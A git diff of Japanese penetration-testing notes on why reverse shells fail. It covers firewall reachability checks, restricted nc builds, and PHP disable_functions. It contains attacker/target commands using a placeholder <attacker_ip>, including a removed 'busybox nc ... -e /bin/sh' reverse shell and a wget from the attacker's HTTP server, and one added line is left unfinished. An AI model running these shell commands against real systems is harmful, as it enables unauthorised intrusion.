@@ -500,17 +500,9 @@ $output = implode("\n", $arr);
 
 - pingが通るか、ポート80への通信が可能かを確認する
 ```sh
-# 攻撃者
-sudo tcpdump -i tun0
-# ターゲット
-ping -c3 <attacker_ip> 
 
-# 攻撃者
-echo test > test.txt
-sudo python -m http.server 80
 
-# ターゲット
-wget <attacker_ip>/test.txt
+
 ```
 
 - `busybox nc`を使う
@@ -521,10 +513,10 @@ wget <attacker_ip>/test.txt
 ### 想定される原因
 
 - FW のルールで遮断されている
-- ターゲット側の制約
+- ターゲット側のコマンド制約
 	- 使用したツールがターゲット環境に存在しない
 	- `nc` などのコマンドが通常版ではなく制限付き
-- Web 実行環境の制限（主に PHP）
+- Web shell実行関数の制限（主に PHP）
 	- `phpinfo()` の `disable_functions` により以下が無効化
 	    - `exec`
 	    - `system`
@@ -535,81 +527,50 @@ wget <attacker_ip>/test.txt
 
 #### FW による遮断
 
+- 何も起きないときはネットワーク到達性を疑う
 - FW で完全に遮断されている場合は、そもそも `invalid shell` にすらならない  
 - つまり`invalid shell` が出る＝通信は届いている
 
-- 何も起きないときはネットワーク到達性を疑う
+1. ICMP が通るか確認
+```sh
+# 攻撃者
+sudo tcpdump -i tun0
+# ターゲット
+ping -c3 <attacker_ip> 
+```
+- tcpdump に ICMP が見えればpingは通る
 
+2. HTTP 通信が可能か確認
+```sh
+# 攻撃者
+echo test > test.txt
+sudo python -m http.server 80
 
-## ネットワーク到達性の確認手順
-
-### 1. ICMP が通るか確認
-
-`# 攻撃者 sudo tcpdump -i tun0  # ターゲット ping -c3 <attacker_ip>`
-
-確認ポイント：
-
-- tcpdump に ICMP が見えるか
-    
-
----
-
-### 2. HTTP 通信が可能か確認
-
-#### 攻撃者側
-
-`echo test > test.txt sudo python -m http.server 80`
-
-#### ターゲット側
-
-`wget http://<attacker_ip>/test.txt`
-
-確認ポイント：
-
+# ターゲット
+wget <attacker_ip>/test.txt
+```
 - ファイル取得できるか
-    
-- 攻撃者側の tcpdump / HTTP サーバログにリクエストが来るか
-    
+- 攻撃者側の python HTTP サーバログにGETリクエストが来るか
 
----
+#### ターゲット側のコマンド制限
 
-## ツール制限への対応
+- 通常の `nc` が使えないケースがあるため`busybox`などとあわせて使う（そのほか、[revshell generator](https://www.revshells.com/)から別の手段を試す）
 
-### busybox 環境の場合
+#### Web shell 実行関数の制限
 
-通常の `nc` が使えないケースがあるため：
+- PHP の設定をまずは確認
+```php
+<?php phpinfo(); ?>
+```
+- `disable_functions`に以下があれば、Web shell はそもそも実行できない
+	- `exec`
+	- `system`
+	- `shell_exec`
+	- `passthru`
+	- `popen`
+	- `proc_open`
 
-`busybox nc <attacker_ip> <port> -e /bin/sh`
-
-のように busybox 経由で nc を呼び出す
-
----
-
-## Web shell 実行可否の確認（PHP）
-
-`<?php phpinfo(); ?>`
-
-確認する項目：
-
-- `disable_functions`
-    
-
-ここに以下が含まれていると Web shell は失敗する：
-
-- `exec`
-    
-- `system`
-    
-- `shell_exec`
-    
-- `passthru`
-    
-- `popen`
-    
-- `proc_open`
-    
-
----
+- 実行できないときは、[]
 
 ## 切り分けの指針まとめ
 
